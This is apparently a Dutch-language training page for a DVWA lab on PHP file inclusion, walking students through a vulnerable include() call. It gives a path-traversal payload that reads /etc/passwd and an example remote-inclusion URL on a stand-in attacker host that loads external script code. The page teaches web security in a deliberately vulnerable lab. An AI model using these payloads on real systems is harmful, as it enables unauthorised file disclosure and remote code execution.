@@ -1,0 +1,92 @@
+---
+sidebar_position: 1
+sidebar_label: 'Low'
+hide_table_of_contents: true
+---
+
+import DvwaLab from '@site/src/components/DvwaLab';
+
+# File Inclusion — Low
+
+Met File Inclusion kun je bestanden van de webserver opvragen (LFI) of zelfs scripts van een externe server inladen (RFI).
+
+## 1. Predict (Voorspel)
+
+De webapplicatie heeft de volgende PHP-code om verschillende pagina's weer te geven:
+
+```php
+$file = $_GET['page'];
+include($file);
+```
+
+**Vraag:** Wat gebeurt er als de gebruiker in de URL de parameter `?page=../../../../../../etc/passwd` invult?
+
+<details>
+
+<summary>Antwoord</summary>
+
+De functie `include()` laadt letterlijk de inhoud van het opgegeven bestand en toont het op het scherm. Door `../` te gebruiken (wat "één map omhoog" betekent in Linux) navigeer je stapsgewijs naar de root van de harde schijf van de webserver. Daarna ga je de map `/etc/` in en open je het bestand `passwd`. De server toont daardoor de complete lijst met alle geregistreerde Linux-gebruikers — dit heet **Local File Inclusion (LFI)**.
+
+</details>
+
+## 2. Run (Uitvoeren)
+
+Start het lab en bekijk de pagina.
+
+<DvwaLab module="file_inclusion" level="low" />
+
+Je ziet dat de URL de parameter `?page=include.php` bevat. Verander de waarde naar `file1.php`, `file2.php` en `file3.php` en observeer wat de applicatie toont.
+
+## 3. Investigate (Onderzoeken)
+
+Verander de URL-parameter nu naar iets dat niet bestaat: `?page=nep.php`.
+
+**Vraag:** Wat zie je op het scherm? Wat onthult de foutmelding over hoe de server met de invoer omgaat?
+
+<details>
+
+<summary>Antwoord</summary>
+
+De server toont een PHP-foutmelding zoals `Warning: include(nep.php): failed to open stream`. Dit onthult drie dingen:
+1. De invoer wordt **ongefilterd** direct aan `include()` doorgegeven.
+2. De foutmelding lekt het volledige serverpad (bijv. `/var/www/html/DVWA/...`) — informatie die een hacker kan gebruiken.
+3. Het pad is relatief aan de locatie van het huidige script — vandaar dat `../` omhoog navigeert.
+
+</details>
+
+## 4. Modify & Make (Aanpassen & Maken)
+
+Je weet nu dat invoer ongefilterd in `include()` belandt. Jouw doel: zorg dat de server het bestand `/etc/passwd` toont.
+
+<details>
+
+<summary>Tip</summary>
+
+Vervang de paginanaam in de URL door een reeks `../` paden. Elke `../` gaat één map omhoog. Je moet hoog genoeg klimmen om vanuit de webroot naar `/etc/` te kunnen navigeren.
+
+</details>
+
+<details>
+
+<summary>Antwoord</summary>
+
+Vul als waarde in voor de `page`-parameter:
+`../../../../../../../../etc/passwd`
+
+Je zult zien dat de opmaak van de pagina vol staat met systeemtekst, beginnend met `root:x:0:0:...`
+
+</details>
+
+## 5. ✓ Wat moest je zien?
+
+:::tip Controle
+- De pagina toont de inhoud van `/etc/passwd` — een lijst van Linux-gebruikers op de server.
+- De tekst begint met iets als `root:x:0:0:root:/root:/bin/bash`.
+- Er is geen foutmelding — de include is geslaagd.
+
+Zie je een foutmelding in plaats van gebruikers? Voeg meer `../` toe — zolang je maar hoog genoeg navigeert, bereik je altijd de root.
+:::
+
+## 6. Er gaat iets mis...
+
+Wat als je in plaats van een lokaal bestand een URL van een andere website probeert in te vullen? Bijvoorbeeld: `?page=http://hacker.nl/kwaadaardig_script.php`. Als dit lukt, noemen we het **Remote File Inclusion (RFI)** — de server downloadt jouw script en voert het uit als eigen code! Als het niet lukt, heeft de beheerder `allow_url_include = Off` ingesteld in `php.ini`. Dat is tegenwoordig de standaard. LFI werkt echter nagenoeg altijd als er geen input-validatie is.
